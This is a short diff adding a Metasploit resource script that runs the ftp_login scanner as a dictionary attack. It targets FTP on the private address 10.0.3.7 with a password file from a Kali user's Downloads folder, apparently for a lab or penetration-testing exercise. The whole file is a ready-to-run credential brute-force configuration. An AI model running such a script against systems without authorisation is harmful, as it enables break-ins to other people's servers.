@@ -1,0 +1,12 @@
+use auxiliary/scanner/ftp/ftp_login
+set rhosts 10.0.3.7
+set rport 21
+
+#dictionary attack inputs
+set USERPASS_FILE /root/../../home/kali/Downloads/ftp-passwords.txt
+
+set stop_on_success false
+set verbose true
+
+run 
+
